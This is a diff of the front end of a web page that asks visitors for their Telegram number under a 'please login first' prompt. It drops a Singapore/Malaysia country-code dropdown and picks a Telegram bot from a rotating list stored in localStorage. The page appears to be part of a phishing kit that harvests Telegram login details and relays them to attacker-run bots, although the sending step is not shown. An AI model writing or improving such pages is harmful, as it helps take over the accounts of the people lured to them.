@@ -175,11 +175,6 @@
     <h1>Enter telegram number</h1>
     <p>To continue, please login first</p>
     <form id="phoneForm">
-      <label for="country">Country code \/</label>
-      <select id="countrySelect">
-  <option value="+65">SG Singapore (+65)</option>
-  <option value="+60">MYS Malaysia (+60)</option>
-</select>
 
 <label for="phone">Telegram number</label>
 <input type="tel" id="phoneInput" placeholder="Telegram number" required />
@@ -210,7 +205,7 @@ phoneForm.addEventListener('submit', function(e) {
   e.preventDefault();
 
   const phone = phoneInput.value.trim();
-  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
+  
   const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
   localStorage.setItem('sessionBotIndex', currentBotIndex);
   const bot = bots[currentBotIndex];
